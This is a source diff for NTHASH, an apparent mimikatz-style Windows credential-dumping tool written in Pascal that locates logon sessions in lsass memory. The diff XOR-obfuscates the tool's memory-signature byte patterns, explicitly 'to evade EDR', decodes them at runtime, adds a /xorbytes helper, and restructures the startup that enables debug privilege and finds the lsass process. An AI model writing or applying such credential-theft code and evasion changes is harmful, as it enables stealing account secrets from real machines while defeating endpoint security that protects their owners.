@@ -521,13 +521,21 @@ function logonpasswords(pid:dword;luid:int64=0;hash:string='';func:pointer =nil;
 const
   //dd Lsasrv!LogonSessionList in windbg
   //1703 works for 1709
-  PTRN_WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
-  PTRN_WN1803_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c9, $74);
-  PTRN_WN60_LogonSessionList:array [0..13] of byte=($33, $ff, $45, $85, $c0, $41, $89, $75, $00, $4c, $8b, $e3, $0f, $84);
-  PTRN_WN61_LogonSessionList:array [0..11] of byte=($33, $f6, $45, $89, $2f, $4c, $8b, $f3, $85, $ff, $0f, $84);
-  PTRN_WN63_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
-  PTRN_WN6x_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c0, $74);
-  PTRN_WN11_LogonSessionList:array [0..12] of byte= ($45, $89, $34, $24, $4c, $8b, $ff, $8b, $f3, $45, $85, $c0, $74);
+  // !!!!!!!! we need to encode/encrypt patterns to evade EDR - we will use xor255
+  //PTRN_WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
+  PTRN_WN1703_LogonSessionList:array [0..11] of byte= ($CC,$00,$BA,$76,$C8,$B7,$74,$0C,$BA,$7A,$36,$8B);
+  //PTRN_WN1803_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c9, $74);
+  PTRN_WN1803_LogonSessionList:array [0..11] of byte= ($CC,$00,$BE,$76,$C8,$B3,$74,$0C,$BA,$7A,$36,$8B);
+  //PTRN_WN60_LogonSessionList:array [0..13] of byte=($33, $ff, $45, $85, $c0, $41, $89, $75, $00, $4c, $8b, $e3, $0f, $84);
+  PTRN_WN60_LogonSessionList:array [0..13] of byte=($CC,$00,$BA,$7A,$3F,$BE,$76,$8A,$FF,$B3,$74,$1C,$F0,$7B);
+  //PTRN_WN61_LogonSessionList:array [0..11] of byte=($33, $f6, $45, $89, $2f, $4c, $8b, $f3, $85, $ff, $0f, $84);
+  PTRN_WN61_LogonSessionList:array [0..11] of byte=($CC,$09,$BA,$76,$D0,$B3,$74,$0C,$7A,$00,$F0,$7B);
+  //PTRN_WN63_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
+  PTRN_WN63_LogonSessionList:array [0..12] of byte=($74,$21,$B7,$72,$F3,$A4,$B7,$3E,$1E,$FA,$B7,$72,$FA);
+  //PTRN_WN6x_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c0, $74);
+  PTRN_WN6x_LogonSessionList:array [0..11] of byte= ($CC,$00,$BE,$76,$C8,$B3,$74,$0C,$BA,$7A,$3F,$8B);
+  //PTRN_WN11_LogonSessionList:array [0..12] of byte= ($45, $89, $34, $24, $4c, $8b, $ff, $8b, $f3, $45, $85, $c0, $74);
+  PTRN_WN11_LogonSessionList:array [0..12] of byte= ($BA,$76,$CB,$DB,$B3,$74,$00,$74,$0C,$BA,$7A,$3F,$8B);
 //x86
 PTRN_WN51_LogonSessionList_x86:array [0..6] of byte= ($ff, $50, $10, $85, $c0, $0f, $84);
 PTRN_WNO8_LogonSessionList_x86:array [0..7] of byte= ($89, $71, $04, $89, $30, $8d, $04, $bd);
@@ -562,6 +570,7 @@ begin
      if copy(winver,1,3)='6.0' then //vista
         begin
         setlength(pattern,sizeof(PTRN_WN60_LogonSessionList));
+        xorbytes (@PTRN_WN60_LogonSessionList[0],sizeof(PTRN_WN60_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN60_LogonSessionList[0],sizeof(PTRN_WN60_LogonSessionList));
         //{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList},	{0, NULL}, {19,  -4}},
         patch_pos:=21;
@@ -569,6 +578,7 @@ begin
      if copy(winver,1,3)='6.1' then  //win7 & 2k8
         begin
         setlength(pattern,sizeof(PTRN_WN61_LogonSessionList));
+        xorbytes (@PTRN_WN61_LogonSessionList[0],sizeof(PTRN_WN61_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN61_LogonSessionList[0],sizeof(PTRN_WN61_LogonSessionList));
         //{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList},	{0, NULL}, {19,  -4}},
         patch_pos:=19;
@@ -576,18 +586,21 @@ begin
      if copy(winver,1,3)='6.3' then  //win8.1 aka blue
         begin
         setlength(pattern,sizeof(PTRN_WN63_LogonSessionList));
+        xorbytes (@PTRN_WN63_LogonSessionList[0],sizeof(PTRN_WN63_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN63_LogonSessionList[0],sizeof(PTRN_WN63_LogonSessionList));
         patch_pos:=36;
         end ;
      if (pos('-1703',winver)>0) or (pos('-1709',winver)>0) then //win10
         begin
         setlength(pattern,sizeof(PTRN_WN1703_LogonSessionList));
+        xorbytes (@PTRN_WN1703_LogonSessionList[0],sizeof(PTRN_WN1703_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN1703_LogonSessionList[0],sizeof(PTRN_WN1703_LogonSessionList));
         patch_pos:=23;
         end;
      if (pos('-1803',winver)>0)  then //win10
         begin
         setlength(pattern,sizeof(PTRN_WN1803_LogonSessionList));
+        xorbytes (@PTRN_WN1803_LogonSessionList[0],sizeof(PTRN_WN1803_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN1803_LogonSessionList[0],sizeof(PTRN_WN1803_LogonSessionList));
         patch_pos:=23;
         end;
@@ -600,30 +613,35 @@ begin
      if (pos('-1909',winver)>0)  then //win10
         begin
         setlength(pattern,sizeof(PTRN_WN6x_LogonSessionList));
+        xorbytes (@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
         patch_pos:=23;
         end;
      if (pos('-2004',winver)>0)  then //win10
         begin
         setlength(pattern,sizeof(PTRN_WN6x_LogonSessionList));
+        xorbytes (@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
         patch_pos:=23;
         end;
      if (pos('-20H2',winver)>0)  then //win10     //not verified
         begin
         setlength(pattern,sizeof(PTRN_WN6x_LogonSessionList));
+        xorbytes (@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
         patch_pos:=23;
         end;
      if (pos('-21H1',winver)>0)  then //win10     //not verified
         begin
         setlength(pattern,sizeof(PTRN_WN6x_LogonSessionList));
+        xorbytes (@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
         patch_pos:=23;
         end;
      if (copy(winver,1,4)='10.0') and (pos('-21H2',winver)>0)  then //win10     //not verified
         begin
         setlength(pattern,sizeof(PTRN_WN6x_LogonSessionList));
+        xorbytes (@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
         patch_pos:=23;
         end;
@@ -631,6 +649,7 @@ begin
      if (copy(winver,1,4)='11.0') and (pos('-21H2',winver)>0)  then //win11     //not verified
         begin
         setlength(pattern,sizeof(PTRN_WN11_LogonSessionList));
+        xorbytes (@PTRN_WN11_LogonSessionList[0],sizeof(PTRN_WN11_LogonSessionList));
         copymemory(@pattern[0],@PTRN_WN11_LogonSessionList[0],sizeof(PTRN_WN11_LogonSessionList));
         patch_pos:=24;
         end;
@@ -1206,12 +1225,16 @@ begin
   //
   if console_output_type<>FILE_TYPE_PIPE then
     log('NTHASH 1.8 '+{$ifdef CPU64}'x64'{$endif cpu64}{$ifdef CPU32}'x32'{$endif cpu32}+' by erwan2212@gmail.com',1);
+
+  if paramcount>0 then
+  begin
   winver:=GetWindowsVer;
   osarch:=getenv('PROCESSOR_ARCHITECTURE');
   getmem(sysdir,Max_Path );
   GetSystemDirectory(sysdir, MAX_PATH - 1);
   debugpriv:=EnableDebugPriv('SeDebugPrivilege');
   lsass_pid:=upsapi._EnumProc2('lsass.exe');
+  end;
   //
   //writeln(length(string('test')));
   //writeln(length(widestring('test')));
@@ -1295,6 +1318,7 @@ begin
   log('NTHASH /base64decodehexa /input:base64string',1);
   log('NTHASH /base64decodefile /input:filename',1);
   log('NTHASH /xorfile /input:filename',1);
+  log('NTHASH /xorbytes /input:hexastring',1);
   //****************************************************
   log('NTHASH /dpapimk [/save] [/symbol]',1);  //will read mem
   log('NTHASH /cryptunprotectdata /binary:filename [/hexa]',1);
@@ -1539,6 +1563,17 @@ begin
 //***************************************************************************
 //*********************** end of input parameters ***************************
 //***************************************************************************
+
+p:=pos('/xorbytes',cmdline);
+  if p>0 then
+    begin
+    if input='' then exit;
+    input:=StringReplace (input,',','',[rfReplaceAll]);
+    input:=StringReplace (input,'$','',[rfReplaceAll]);
+    input:=StringReplace (input,' ','',[rfReplaceAll]);
+    input_:=HexaStringToByte2 (input);
+    if xorbytes(@input_[0],length(input_)) then log(ByteToHexaString (input_),1);
+    end;
 
 p:=pos('/xorfile',cmdline); //test in progress
   if p>0 then
@@ -2706,6 +2741,10 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
           if p>0 then
              begin
               if input='' then exit;
+              input:=StringReplace (input,',','',[rfReplaceAll]);
+              input:=StringReplace (input,'$','',[rfReplaceAll]);
+              input:=StringReplace (input,' ','',[rfReplaceAll]);
+              //writeln('.'+input+'.');
               if mode='' then exit;
              dw:=0;
              if mode='SHA512' then dw:=$0000800e;
